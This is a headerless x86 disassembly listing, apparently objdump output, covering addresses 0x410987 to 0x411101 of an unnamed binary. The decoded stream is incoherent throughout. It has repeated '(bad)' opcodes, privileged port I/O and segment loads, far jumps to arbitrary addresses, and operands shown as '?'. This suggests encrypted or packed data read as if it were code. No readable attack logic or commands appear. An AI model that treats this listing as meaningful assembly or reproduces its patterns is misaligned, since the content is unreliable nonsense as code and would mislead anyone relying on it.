  410987:	mov    ah,0xa4
  410989:	cmp    edx,edx
  41098b:	push   ecx
  41098c:	sub    ecx,edi
  41098e:	adc    esp,DWORD PTR [esi+0x53f4cf9f]
  410994:	pop    es
  410995:	jmp    0xf123:0xd12070d0
  41099c:	popf   
  41099d:	pop    ds
  41099e:	or     ebx,ecx
  4109a0:	addr16 enter 0xc7da,0xba
  4109a5:	(bad)  
  4109a6:	mov    cs,WORD PTR [esi]
  4109a8:	ins    DWORD PTR es:[edi],dx
  4109a9:	add    DWORD PTR [eax],esi
  4109ab:	and    ah,BYTE PTR [edx-0x7d]
  4109ae:	pop    eax
  4109af:	into   
  4109b0:	loope  0x41093a
  4109b2:	push   ds
  4109b3:	aaa    
  4109b4:	lds    esi,FWORD PTR [ebx]
  4109b6:	cmp    al,0x54
  4109b8:	mov    dh,0x41
  4109ba:	xor    eax,DWORD PTR [ecx]
  4109bc:	jp     0x4109dd
  4109be:	xchg   ecx,eax
  4109bf:	push   ds
  4109c0:	cli    
  4109c1:	xchg   ebx,eax
  4109c2:	aaa    
  4109c3:	add    al,BYTE PTR [ebx]
  4109c5:	int3   
  4109c6:	repz add BYTE PTR [edx+0x3c],bl
  4109ca:	mov    edx,0xca2a9648
  4109cf:	push   edi
  4109d0:	cmp    DWORD PTR [edi-0x36],ecx
  4109d3:	cmp    DWORD PTR [ebx+0x64087682],eax
  4109d9:	push   esi
  4109da:	sbb    eax,0x81f36df0
  4109df:	xchg   ebx,eax
  4109e0:	and    bl,BYTE PTR [eax]
  4109e2:	mov    WORD PTR [edx-0x5d],ds
  4109e5:	mov    al,BYTE PTR [esi+0x5a]
  4109e8:	sbb    BYTE PTR [ebx+0x65bcfeb0],0x21
  4109ef:	in     eax,dx
  4109f0:	mov    cl,0x43
  4109f2:	mov    al,gs:0xfadeb87a
  4109f8:	shl    DWORD PTR [ebx-0x72c459cf],cl
  4109fe:	std    
  4109ff:	dec    edx
  410a00:	cmp    bh,ch
  410a02:	out    0x6,eax
  410a04:	mov    eax,ds:0x8302403
  410a09:	ins    DWORD PTR es:[edi],dx
  410a0a:	push   eax
  410a0b:	jo     0x410a2d
  410a0d:	(bad)  
  410a0e:	(bad)  
  410a10:	jle    0x410a25
  410a12:	xor    al,0x83
  410a14:	jge    0x41099f
  410a16:	and    BYTE PTR [edi],ch
  410a18:	and    bh,BYTE PTR [ebp+ebx*1+0xeb56309]
  410a1f:	mov    ebp,0x7b64f94c
  410a24:	sub    edx,DWORD PTR [esi+eax*2]
  410a27:	je     0x4109f6
  410a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a2a:	lods   al,BYTE PTR ds:[esi]
  410a2b:	jecxz  0x410a62
  410a2d:	mov    eax,ds:0xdd1a2c1
  410a32:	dec    esi
  410a33:	into   
  410a34:	xor    eax,DWORD PTR [ebx-0x78]
  410a37:	mov    esp,0x55a7dd4
  410a3c:	jg     0x410a24
  410a3e:	ror    al,0x74
  410a41:	std    
  410a42:	add    edi,DWORD PTR [ebp-0x405857d8]
  410a48:	xchg   ecx,eax
  410a49:	out    0x2c,al
  410a4b:	inc    edi
  410a4c:	div    esi
  410a4e:	jg     0x410aca
  410a50:	outs   dx,DWORD PTR ds:[esi]
  410a51:	(bad)  
  410a52:	sbb    edx,edx
  410a54:	jle    0x4109d6
  410a56:	jns    0x410a92
  410a58:	popa   
  410a59:	jp     0x410ada
  410a5b:	inc    ecx
  410a5c:	pop    ebp
  410a5d:	ds mov dl,0x5e
  410a60:	lds    ecx,FWORD PTR [ebx+0x660b8230]
  410a66:	mov    WORD PTR [ebp+0x5],fs
  410a69:	in     al,dx
  410a6a:	aam    0xc9
  410a6c:	ss cli 
  410a6e:	or     al,0xeb
  410a70:	pop    ecx
  410a71:	mov    esp,DWORD PTR [eax-0x209fa4db]
  410a77:	push   esp
  410a78:	test   edx,esi
  410a7a:	in     al,dx
  410a7b:	mov    ch,0x36
  410a7d:	iret   
  410a7e:	out    dx,eax
  410a7f:	fwait
  410a80:	adc    DWORD PTR [ebp-0x56],0x7f
  410a84:	sbb    eax,0x82c004b
  410a89:	adc    al,0x9d
  410a8b:	leave  
  410a8c:	cmp    DWORD PTR ds:0xf84c20d9,ecx
  410a92:	dec    edx
  410a93:	fld    DWORD PTR [ecx]
  410a95:	inc    edi
  410a96:	cmp    BYTE PTR [esi-0x43],0x70
  410a9a:	xlat   BYTE PTR ds:[ebx]
  410a9b:	cmp    ah,BYTE PTR [eax-0x31a1c49c]
  410aa1:	adc    DWORD PTR [edx-0x5590ff12],edx
  410aa7:	mov    ecx,0x79915bd9
  410aac:	or     BYTE PTR [ebx+0x2294322e],al
  410ab2:	mov    ebx,0x8916462f
  410ab7:	pop    esi
  410ab8:	mov    cl,0x6a
  410aba:	popa   
  410abb:	pop    ss
  410abc:	cld    
  410abd:	shl    DWORD PTR [ecx+0x70ae2395],cl
  410ac3:	scas   eax,DWORD PTR es:[edi]
  410ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ac5:	jg     0x410aae
  410ac7:	mov    ecx,0xada07535
  410acc:	pusha  
  410acd:	pop    edi
  410ace:	xor    al,0xf4
  410ad0:	sub    al,BYTE PTR [edi+0x30]
  410ad3:	mov    ch,0xd5
  410ad5:	sub    dl,bl
  410ad7:	and    cl,bl
  410ad9:	icebp  
  410ada:	dec    ebp
  410adb:	pop    edi
  410adc:	(bad)  
  410add:	xlat   BYTE PTR ds:[ebx]
  410ade:	lds    eax,FWORD PTR [edx]
  410ae0:	mov    edi,0x15e6ad47
  410ae5:	dec    ecx
  410ae6:	pop    ecx
  410ae7:	xchg   ecx,eax
  410ae8:	ror    DWORD PTR [ebx-0x4f],1
  410aeb:	sub    al,0xce
  410aed:	mov    esi,DWORD PTR [edi]
  410aef:	les    esp,FWORD PTR [ebp-0x54]
  410af2:	jmp    0x410a80
  410af4:	sub    DWORD PTR [edi-0x7aa650a2],0x8dbe5ce1
  410afe:	shr    DWORD PTR [edi],1
  410b00:	mov    eax,0x6a041f20
  410b05:	adc    eax,0xf567531
  410b0a:	sbb    al,0xc1
  410b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b0d:	in     al,0x8d
  410b0f:	(bad)  
  410b10:	and    DWORD PTR [ebx+0x633cf86b],ecx
  410b16:	out    dx,eax
  410b17:	inc    esi
  410b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b19:	or     eax,0x60a9ed3d
  410b1e:	rcr    cl,0x11
  410b21:	popf   
  410b22:	or     eax,0x3f4ab5f3
  410b27:	cmp    eax,0x2e560ae8
  410b2c:	out    dx,eax
  410b2d:	sub    ebp,DWORD PTR [esi-0x1ae97a0f]
  410b33:	(bad)  [eax-0x39ca6005]
  410b39:	pop    esi
  410b3a:	daa    
  410b3b:	(bad)  
  410b3c:	adc    BYTE PTR [eax],al
  410b3e:	test   al,0x8f
  410b40:	popa   
  410b41:	out    dx,al
  410b42:	lahf   
  410b43:	or     BYTE PTR [edi-0x9],0xb9
  410b47:	jns    0x410b67
  410b49:	scas   al,BYTE PTR es:[edi]
  410b4a:	fist   WORD PTR [ecx+0x32]
  410b4d:	sub    ecx,DWORD PTR [ebp-0x5009ec42]
  410b53:	ins    BYTE PTR es:[edi],dx
  410b54:	mov    WORD PTR [edi-0x1],es
  410b57:	psraw  mm0,QWORD PTR [eax+ebp*4]
  410b5b:	pop    es
  410b5c:	das    
  410b5d:	cdq    
  410b5e:	inc    edi
  410b5f:	daa    
  410b60:	jl     0x410bc8
  410b62:	test   DWORD PTR [ecx],ecx
  410b64:	outs   dx,BYTE PTR ds:[esi]
  410b65:	dec    ebx
  410b66:	push   0x43
  410b68:	push   ecx
  410b69:	dec    ecx
  410b6a:	out    0x5a,al
  410b6c:	mov    esi,0x55a44fbf
  410b71:	jnp    0x410bee
  410b73:	sbb    eax,0xa8442f72
  410b78:	jge    0x410bf4
  410b7a:	mov    ebx,0xfbe69a8c
  410b7f:	jge    0x410b48
  410b81:	je     0x410ba2
  410b83:	mov    dh,0x86
  410b85:	lods   al,BYTE PTR ds:[esi]
  410b86:	cs push esi
  410b88:	cmp    dh,bh
  410b8a:	(bad)  
  410b8b:	call   0xa471:0x168af697
  410b92:	push   eax
  410b93:	xor    eax,0xc9a13660
  410b98:	pop    ss
  410b99:	xlat   BYTE PTR ds:[ebx]
  410b9a:	test   eax,0xdf968f8b
  410b9f:	(bad)  
  410ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ba1:	lahf   
  410ba2:	stos   BYTE PTR es:[edi],al
  410ba3:	cmp    BYTE PTR ds:0xd911c4ab,dl
  410ba9:	inc    esp
  410baa:	push   edx
  410bab:	fld    TBYTE PTR [ecx+0x76]
  410bae:	inc    ecx
  410baf:	pop    ecx
  410bb0:	popf   
  410bb1:	stos   BYTE PTR es:[edi],al
  410bb2:	loope  0x410b83
  410bb4:	sbb    BYTE PTR [edi+0x77d652ee],bh
  410bba:	dec    ebx
  410bbb:	in     eax,0x15
  410bbd:	dec    eax
  410bbe:	sbb    eax,0x19358ddc
  410bc3:	pop    ds
  410bc4:	push   0x26bb03a
  410bc9:	test   eax,0xba8e5bc7
  410bce:	xchg   ecx,eax
  410bcf:	(bad)  
  410bd0:	jl     0x410c38
  410bd2:	inc    ecx
  410bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bd4:	pop    es
  410bd5:	scas   eax,DWORD PTR es:[edi]
  410bd6:	fist   WORD PTR [ecx+0x58b74970]
  410bdc:	sbb    eax,0x6485f0b2
  410be1:	icebp  
  410be2:	cmp    ebx,DWORD PTR [ecx+0x16]
  410be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410be6:	mov    dh,0x44
  410be8:	call   0x68303ab7
  410bed:	in     al,0xc5
  410bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bf0:	or     BYTE PTR [edx+eiz*8+0x5b],ah
  410bf4:	stos   DWORD PTR es:[edi],eax
  410bf5:	fdiv   QWORD PTR [ebp+0x18]
  410bf8:	pop    esp
  410bf9:	ror    bl,1
  410bfb:	aam    0xee
  410bfd:	nop
  410bfe:	(bad)  
  410c00:	and    ah,BYTE PTR [eax-0x2a023b44]
  410c06:	arpl   WORD PTR [ebx],cx
  410c08:	popa   
  410c09:	mov    bh,0xef
  410c0b:	sbb    BYTE PTR [ebp+edx*8-0x134f68ee],bh
  410c12:	dec    edx
  410c13:	pop    ebx
  410c14:	or     eax,DWORD PTR [bx-0x20]
  410c18:	ror    DWORD PTR ds:0x1c66230,0x4a
  410c1f:	add    DWORD PTR [esi+0x44],0x4c
  410c23:	std    
  410c24:	sbb    DWORD PTR [ebx-0x24],esp
  410c27:	ins    DWORD PTR es:[edi],dx
  410c28:	scas   al,BYTE PTR es:[edi]
  410c29:	in     al,dx
  410c2a:	mov    fs,WORD PTR [edi+0x5d65e893]
  410c30:	and    edx,DWORD PTR ds:0xe7d4b699
  410c36:	add    eax,0xde214ca3
  410c3b:	and    eax,0xfa42e117
  410c40:	jo     0x410c69
  410c42:	push   ebp
  410c43:	push   edx
  410c44:	push   ss
  410c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c46:	aam    0x28
  410c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c49:	gs shr BYTE PTR ds:[ecx],cl
  410c4d:	cmp    dh,BYTE PTR [edi+0x24]
  410c50:	mov    ecx,0xfda38e44
  410c55:	add    DWORD PTR [ebp+0xbc6b2a],edi
  410c5b:	pop    es
  410c5c:	jae    0x410c06
  410c5e:	fucomip st,st(5)
  410c60:	pop    eax
  410c61:	ficomp WORD PTR [ebx]
  410c63:	cmp    ebp,ebp
  410c65:	std    
  410c66:	aaa    
  410c67:	add    eax,ebx
  410c69:	dec    edx
  410c6a:	cmc    
  410c6b:	sub    al,dl
  410c6d:	adc    ch,ch
  410c6f:	jecxz  0x410ccd
  410c71:	pop    esp
  410c72:	push   esi
  410c73:	cmp    BYTE PTR [ebp+eax*2-0x3d],bl
  410c77:	shl    DWORD PTR [ecx+0x49],cl
  410c7a:	xchg   esp,eax
  410c7b:	bound  ebp,QWORD PTR [ebp-0x46ca5003]
  410c81:	sar    DWORD PTR [edi],cl
  410c83:	inc    ecx
  410c84:	xor    BYTE PTR [edx+0x33],bh
  410c87:	sbb    bl,BYTE PTR [ecx-0x2c092d53]
  410c8d:	jle    0x410d0d
  410c8f:	mov    eax,0x5f6c94ba
  410c94:	fild   QWORD PTR [esp-0x56]
  410c98:	and    al,0xe7
  410c9a:	out    dx,eax
  410c9b:	jmp    DWORD PTR [edx-0x44]
  410c9e:	je     0x410cb2
  410ca0:	stc    
  410ca1:	aam    0xf7
  410ca3:	pop    esi
  410ca4:	leave  
  410ca5:	adc    bh,dl
  410ca7:	mov    esi,0x4313e3b
  410cac:	sbb    DWORD PTR [esi-0x69],esi
  410caf:	sbb    eax,DWORD PTR [ecx+ebx*4+0x38]
  410cb3:	ss ret 
  410cb5:	mov    al,0x6a
  410cb7:	xchg   esp,eax
  410cb8:	push   ecx
  410cb9:	push   esi
  410cba:	sbb    BYTE PTR [edx],0x8d
  410cbd:	sbb    DWORD PTR [eax+0x61849b5],0xd0a3dcf3
  410cc7:	icebp  
  410cc8:	cwde   
  410cc9:	sbb    al,0x3
  410ccb:	into   
  410ccc:	bound  esp,QWORD PTR [ebx+0x6155e9f]
  410cd2:	mov    esp,0xc261ce53
  410cd7:	pusha  
  410cd8:	jecxz  0x410ccd
  410cda:	lods   al,BYTE PTR ds:[esi]
  410cdb:	test   DWORD PTR [ebp+0x2f696b33],ebx
  410ce1:	out    dx,al
  410ce2:	scas   al,BYTE PTR es:[edi]
  410ce3:	mov    WORD PTR [eax+0x47],ss
  410ce6:	sbb    ebx,DWORD PTR [esi+0x226bfaf]
  410cec:	data16 sub bh,BYTE PTR [ebx]
  410cef:	addr16 jnp 0x410cf8
  410cf2:	jae    0x410d19
  410cf4:	fdivr  QWORD PTR [esi+0x44]
  410cf7:	fst    DWORD PTR ds:0x65e82f02
  410cfd:	sbb    cl,BYTE PTR [eax-0x69]
  410d00:	div    DWORD PTR [edi+esi*4]
  410d03:	add    esp,eax
  410d05:	int    0xd0
  410d07:	fstp   DWORD PTR [ebp-0x6d816953]
  410d0d:	mov    esp,0x735ed1c8
  410d12:	das    
  410d13:	arpl   WORD PTR [eax+0x23],bp
  410d16:	les    edx,FWORD PTR [esi+0x437a8300]
  410d1c:	mov    eax,0x2f683b41
  410d21:	fbld   TBYTE PTR [ecx]
  410d23:	stos   DWORD PTR es:[edi],eax
  410d24:	fisttp QWORD PTR [esi+0x3a084e3a]
  410d2a:	adc    al,0x84
  410d2c:	push   DWORD PTR [esi-0x17]
  410d2f:	or     DWORD PTR ds:0xca8b376e,0x4f350a41
  410d39:	dec    ebx
  410d3a:	fld    st(1)
  410d3c:	call   FWORD PTR [ebx]
  410d3e:	test   BYTE PTR ds:0x6fc5daa9,ch
  410d44:	or     esp,DWORD PTR [ebx-0x2e]
  410d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d48:	aaa    
  410d49:	mov    WORD PTR [edi],es
  410d4b:	lahf   
  410d4c:	sbb    BYTE PTR [esi-0x7afbf1fa],dh
  410d52:	(bad)  
  410d53:	sti    
  410d54:	lods   al,BYTE PTR ds:[esi]
  410d55:	jl     0x410d99
  410d57:	jo     0x410dc5
  410d59:	mov    WORD PTR [ecx+ebp*4-0x6d881671],fs
  410d60:	or     ah,BYTE PTR [ecx]
  410d62:	lea    edx,[ecx-0x5a]
  410d65:	fs jns 0x410cf0
  410d68:	(bad)  
  410d69:	xchg   ebp,eax
  410d6a:	lods   eax,DWORD PTR ds:[esi]
  410d6b:	js     0x410dca
  410d6d:	test   ebp,esi
  410d6f:	sahf   
  410d70:	pop    edi
  410d71:	mov    bl,dh
  410d73:	int    0xb6
  410d75:	js     0x410d59
  410d77:	adc    ebx,0xffffff87
  410d7a:	test   eax,0x24af4518
  410d7f:	test   eax,0xcc8f557b
  410d84:	ret    0xdae4
  410d87:	sbb    eax,0x4f617096
  410d8c:	adc    DWORD PTR [edi-0x9],edi
  410d8f:	inc    eax
  410d90:	ret    0x35db
  410d93:	push   eax
  410d94:	ret    
  410d95:	sti    
  410d96:	push   edx
  410d97:	xchg   ebp,ecx
  410d99:	call   0x327a:0x58b6c64f
  410da0:	ret    0x11da
  410da3:	add    BYTE PTR [edx+0x210a4999],ch
  410da9:	or     ah,BYTE PTR [eax+0x5faef27a]
  410daf:	cli    
  410db0:	mov    dh,0xf4
  410db2:	add    bl,BYTE PTR [ebp-0x49318b48]
  410db8:	jne    0x410dd8
  410dba:	imul   edx,DWORD PTR [edi+esi*1],0xae8fa9a2
  410dc1:	gs or  ebp,edi
  410dc4:	aad    0x40
  410dc6:	and    al,0x48
  410dc8:	sti    
  410dc9:	scas   al,BYTE PTR es:[edi]
  410dca:	test   al,0xa7
  410dcc:	jge    0x410d60
  410dce:	mov    ecx,0xc4e237f3
  410dd3:	cmc    
  410dd4:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  410dd6:	inc    ebp
  410dd7:	push   eax
  410dd8:	lds    esp,FWORD PTR [ecx]
  410dda:	xchg   DWORD PTR [esi-0x63],edx
  410ddd:	push   ebp
  410dde:	xlat   BYTE PTR ds:[ebx]
  410ddf:	scas   eax,DWORD PTR es:[edi]
  410de0:	lds    esi,FWORD PTR [ecx-0xae7eacb]
  410de6:	adc    bl,BYTE PTR [ecx]
  410de8:	cmp    ah,dh
  410dea:	gs dec ebx
  410dec:	sub    bl,ch
  410dee:	jmp    0x410dde
  410df0:	or     bh,0x70
  410df3:	xchg   ecx,eax
  410df4:	(bad)  
  410df5:	repnz int 0x83
  410df8:	and    BYTE PTR [edx],al
  410dfa:	scas   al,BYTE PTR es:[edi]
  410dfb:	shr    DWORD PTR [ecx],cl
  410dfd:	cdq    
  410dfe:	or     al,0x2c
  410e00:	rcl    ebp,cl
  410e02:	add    eax,0xcb5416e8
  410e07:	inc    edi
  410e08:	or     ah,BYTE PTR [ebx]
  410e0a:	in     al,0xca
  410e0c:	and    DWORD PTR [ebp-0x5a87319d],ebx
  410e12:	push   eax
  410e13:	jb     0x410e41
  410e15:	inc    edx
  410e16:	mov    dl,0xe8
  410e18:	inc    edi
  410e19:	mov    eax,0xed87ce58
  410e1e:	loopne 0x410e93
  410e20:	pop    ecx
  410e21:	mov    edx,0x32764668
  410e26:	xor    al,0x35
  410e28:	sbb    ecx,DWORD PTR [edx+0x40e03ca5]
  410e2e:	mov    DWORD PTR [ecx+0x6cb92397],ebx
  410e34:	outs   dx,BYTE PTR ds:[esi]
  410e35:	ret    
  410e36:	in     al,dx
  410e37:	out    0xab,eax
  410e39:	sti    
  410e3a:	xchg   ecx,eax
  410e3b:	(bad)  
  410e3c:	lods   al,BYTE PTR ds:[esi]
  410e3d:	mov    ecx,0xacfb6d74
  410e42:	mov    dh,0xb1
  410e44:	pop    esi
  410e45:	or     DWORD PTR [ebx*1+0x47e44be4],esp
  410e4c:	cs mov cl,0x2a
  410e4f:	daa    
  410e50:	shl    BYTE PTR [edx+0x50],1
  410e53:	stc    
  410e54:	lock pop ebx
  410e56:	jl     0x410e1a
  410e58:	pop    edi
  410e59:	pop    edi
  410e5a:	ja     0x410e0a
  410e5c:	or     BYTE PTR [eax],al
  410e5e:	cli    
  410e5f:	outs   dx,BYTE PTR ds:[esi]
  410e60:	pop    eax
  410e61:	ror    BYTE PTR [ecx],cl
  410e63:	pop    ds
  410e64:	inc    esi
  410e65:	push   esp
  410e66:	ins    BYTE PTR es:[edi],dx
  410e67:	mov    cl,0x45
  410e69:	and    al,0x61
  410e6b:	mov    ?,WORD PTR [ebx]
  410e6d:	jbe    0x410e02
  410e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e70:	xchg   esi,eax
  410e71:	sti    
  410e72:	mov    cl,0x2f
  410e74:	and    al,al
  410e76:	dec    ebx
  410e77:	mov    edx,0x18bdc216
  410e7c:	jp     0x410e43
  410e7e:	xor    esp,DWORD PTR [eax]
  410e80:	in     eax,dx
  410e81:	mov    dh,0x8d
  410e83:	add    cl,ah
  410e85:	lea    edx,[edi]
  410e87:	inc    ebp
  410e88:	push   0x73
  410e8a:	or     ebx,DWORD PTR [eax]
  410e8c:	rcr    cl,1
  410e8e:	sar    BYTE PTR [esi],0x71
  410e91:	push   eax
  410e92:	jnp    0x410e80
  410e94:	ja     0x410e8d
  410e96:	mov    dh,0x57
  410e98:	jns    0x410ead
  410e9a:	sbb    ebx,DWORD PTR [edi+0x42a091e6]
  410ea0:	jg     0x410f13
  410ea2:	mov    eax,ds:0x606f0d9c
  410ea7:	retf   
  410ea8:	sub    eax,0x967f26f9
  410ead:	lgs    ebx,FWORD PTR [ecx-0x6a]
  410eb1:	push   cs
  410eb2:	mov    ds:0xd6489423,al
  410eb7:	or     al,0x64
  410eb9:	sti    
  410eba:	into   
  410ebb:	add    edi,DWORD PTR [edi+0x6d1a77c0]
  410ec1:	sub    ah,BYTE PTR [edi]
  410ec3:	mov    edi,0x909b0740
  410ec8:	xchg   ebp,eax
  410ec9:	dec    edx
  410eca:	push   ss
  410ecb:	adc    edi,DWORD PTR [edi-0x68]
  410ece:	push   ebx
  410ecf:	pop    es
  410ed0:	(bad)  
  410ed1:	xor    esi,ebx
  410ed3:	sbb    ch,0xdd
  410ed6:	cdq    
  410ed7:	popa   
  410ed8:	mov    edi,0xa2bec2c3
  410edd:	push   0xffffffb5
  410edf:	inc    eax
  410ee0:	jmp    DWORD PTR [ecx]
  410ee2:	aam    0xfe
  410ee4:	push   ecx
  410ee5:	(bad)  
  410ee6:	push   eax
  410ee7:	sahf   
  410ee8:	(bad)  
  410ee9:	jmp    0x82a35acf
  410eee:	inc    ecx
  410eef:	dec    esp
  410ef0:	jno    0x410f1f
  410ef2:	and    DWORD PTR [bx+di+0xb],esp
  410ef6:	fcomp  DWORD PTR [edi+edi*8-0x6386ccf4]
  410efd:	jl     0x410ed9
  410eff:	mov    edi,0x9e5d2a8
  410f04:	mov    edi,0xb57c3cad
  410f09:	inc    DWORD PTR [ebx]
  410f0b:	fmul   DWORD PTR [edi-0x48]
  410f0e:	(bad)  [eax]
  410f10:	sbb    BYTE PTR [eax],0xed
  410f13:	frstor [esi+0x2629e897]
  410f19:	push   edi
  410f1a:	nop    edi
  410f1d:	sahf   
  410f1e:	test   al,0x62
  410f20:	adc    ebp,edx
  410f22:	cmp    ah,BYTE PTR [ebp-0x6f]
  410f25:	outs   dx,BYTE PTR ds:[esi]
  410f26:	mov    dl,0xfc
  410f28:	imul   ecx,DWORD PTR [esi+0x37],0xf3670814
  410f2f:	shr    DWORD PTR [eax],cl
  410f31:	xor    al,0xf1
  410f33:	test   al,0x48
  410f35:	push   esp
  410f36:	movzx  esp,WORD PTR [edx-0x2898835a]
  410f3d:	inc    edi
  410f3e:	lods   eax,DWORD PTR ds:[esi]
  410f3f:	adc    DWORD PTR [esi],esp
  410f41:	jbe    0x410fc1
  410f43:	sbb    ah,dl
  410f45:	dec    edi
  410f46:	jl     0x410f1f
  410f48:	push   0x5c4a4eae
  410f4d:	ret    0xa78e
  410f50:	xchg   esi,eax
  410f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f52:	icebp  
  410f53:	imul   edi,DWORD PTR [ebp+0x4a12d2a9],0x58
  410f5a:	xlat   BYTE PTR ds:[ebx]
  410f5b:	jne    0x410f2a
  410f5d:	mov    al,ds:0x4f35a477
  410f62:	push   edi
  410f63:	add    dl,BYTE PTR [eax+ebp*8+0x61c00ca1]
  410f6a:	pop    ds
  410f6b:	call   0x62e223ac
  410f70:	mov    ecx,0xfe8a56eb
  410f75:	std    
  410f76:	sub    al,0x60
  410f78:	xor    ebx,0x2a
  410f7b:	mov    dh,ch
  410f7d:	mov    ebx,ebx
  410f7f:	cs (bad) 
  410f82:	cmp    DWORD PTR [esi-0x62],ecx
  410f85:	in     eax,0xf2
  410f87:	loopne 0x410fe7
  410f89:	in     eax,dx
  410f8a:	or     DWORD PTR [ebx+0x42],0x3
  410f8e:	dec    ebx
  410f8f:	cwde   
  410f90:	pop    es
  410f91:	mov    ds:0xa392440e,al
  410f96:	call   0xa7fac27d
  410f9b:	mov    al,0x3e
  410f9d:	adc    BYTE PTR ds:0x9d0a0ef9,bh
  410fa3:	popa   
  410fa4:	ret    
  410fa5:	retf   0x3978
  410fa8:	dec    DWORD PTR [edi-0x353e2666]
  410fae:	pushf  
  410faf:	hlt    
  410fb0:	mov    DWORD PTR [eax],esp
  410fb2:	xlat   BYTE PTR ds:[ebx]
  410fb3:	adc    esp,esp
  410fb5:	call   0xc609:0xf4a090b2
  410fbc:	hlt    
  410fbd:	shl    BYTE PTR [edx+0x2d8d147a],cl
  410fc3:	xchg   DWORD PTR [ebx-0x35],esi
  410fc6:	shl    DWORD PTR [esi],0x69
  410fc9:	ror    BYTE PTR [esi],1
  410fcb:	icebp  
  410fcc:	inc    esi
  410fcd:	clc    
  410fce:	mov    edi,0xc6d4d314
  410fd3:	xor    esi,eax
  410fd5:	or     esp,DWORD PTR [edx-0x2b5cb357]
  410fdb:	or     DWORD PTR [eax+0x0],esp
  410fde:	pop    edi
  410fdf:	pop    ebx
  410fe0:	bound  esi,QWORD PTR [edi+0x7c4dcec8]
  410fe6:	push   ds
  410fe7:	pop    eax
  410fe8:	mov    ds:0xb0b4203b,al
  410fed:	(bad)  
  410fee:	fnstcw WORD PTR [edi+0x64]
  410ff1:	leave  
  410ff2:	push   es
  410ff3:	rol    DWORD PTR [eax],0x46
  410ff6:	int    0x2a
  410ff8:	dec    esi
  410ff9:	popf   
  410ffa:	mov    ds:0x95d3774,eax
  410fff:	leave  
  411000:	add    eax,0xbfc2b455
  411005:	mov    WORD PTR [ebx+0x4f392ac2],gs
  41100b:	leave  
  41100c:	lods   eax,DWORD PTR ds:[esi]
  41100d:	mov    ecx,ebx
  41100f:	add    ecx,DWORD PTR [edx+0x4709bd8d]
  411015:	fbld   TBYTE PTR [ecx+0x2e2c9bbc]
  41101b:	fdivr  st,st(2)
  41101d:	test   al,0x74
  41101f:	inc    ebp
  411020:	add    eax,0x4bf8e13c
  411025:	push   edx
  411026:	push   eax
  411027:	jp     0xbe59e177
  41102d:	mov    esi,0x4170a144
  411032:	xor    esp,DWORD PTR [ebp+edx*2-0x3bd63798]
  411039:	js     0x410fda
  41103b:	inc    ecx
  41103c:	xor    al,0xc3
  41103e:	popf   
  41103f:	shr    BYTE PTR [eax+0x3a],1
  411042:	ja     0x41100e
  411044:	push   ss
  411045:	xor    BYTE PTR [esi],bh
  411047:	data16 jne 0x4110be
  41104a:	and    bh,bl
  41104c:	shr    ebx,cl
  41104e:	xchg   esp,eax
  41104f:	mov    WORD PTR [ebx-0x32c54046],es
  411055:	lahf   
  411056:	pop    ebp
  411057:	adc    eax,0x19f84ff5
  41105c:	push   0x12d3eed0
  411061:	dec    ebx
  411062:	mov    ?,WORD PTR [ebp-0x2b]
  411065:	xchg   ebx,eax
  411066:	dec    esp
  411067:	or     DWORD PTR [eax-0x44],ebx
  41106a:	xor    ax,0xa246
  41106e:	mov    ds:0xc8d518ad,eax
  411073:	pop    ebp
  411074:	add    BYTE PTR [ebx+0x1f2eb17c],bl
  41107a:	pop    esi
  41107b:	dec    edi
  41107c:	pop    edi
  41107d:	aam    0x3e
  41107f:	loop   0x411083
  411081:	pop    ebx
  411082:	pop    ebx
  411083:	mov    ds:0xd8b5f395,al
  411088:	push   cs
  411089:	dec    edx
  41108a:	aam    0x99
  41108c:	dec    esp
  41108d:	xchg   ecx,eax
  41108e:	jle    0x411095
  411090:	mov    ebp,0x533e9717
  411095:	sbb    eax,ebp
  411097:	sub    al,BYTE PTR [edx+ebp*1]
  41109a:	mov    ah,0x7c
  41109c:	mov    esi,0xada03fdb
  4110a1:	add    bl,BYTE PTR [edx+0xf]
  4110a4:	jne    0x41102e
  4110a6:	lods   al,BYTE PTR ds:[esi]
  4110a7:	mov    esp,0xc0b3e77d
  4110ac:	sbb    al,BYTE PTR [esi-0x6e]
  4110af:	lahf   
  4110b0:	scas   eax,DWORD PTR es:[edi]
  4110b1:	out    0x1e,al
  4110b3:	ret    0x3274
  4110b6:	dec    esi
  4110b7:	inc    esp
  4110b8:	dec    esi
  4110b9:	xor    cl,bl
  4110bb:	pop    esi
  4110bc:	dec    esi
  4110bd:	sub    ah,BYTE PTR [eax]
  4110bf:	fchs   
  4110c1:	loop   0x4110c6
  4110c3:	ins    DWORD PTR es:[edi],dx
  4110c4:	cmp    BYTE PTR [edx-0x48],bh
  4110c7:	cmp    eax,0x5cf33d2
  4110cc:	and    esi,DWORD PTR [ebp+ebx*8-0x44]
  4110d0:	fld    st(5)
  4110d2:	mov    ecx,?
  4110d4:	dec    ecx
  4110d5:	inc    esi
  4110d6:	jmp    0x411104
  4110d8:	inc    eax
  4110d9:	inc    edi
  4110da:	mov    ch,0x2c
  4110dc:	imul   eax,DWORD PTR [ebx],0xffffffcf
  4110df:	(bad)  
  4110e0:	pop    ecx
  4110e1:	mov    al,0x54
  4110e3:	inc    DWORD PTR ds:0x41c31dce
  4110e9:	bound  edi,QWORD PTR [ebp+0x67f4e39d]
  4110ef:	add    cl,BYTE PTR [ecx+edi*4-0xa]
  4110f3:	shl    BYTE PTR [esp+ecx*4],0xec
  4110f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110f8:	mov    eax,0xfff1dc9a
  4110fd:	aad    0xc0
  4110ff:	lods   al,BYTE PTR ds:[esi]
  411100:	xchg   esi,eax
  411101:	into   
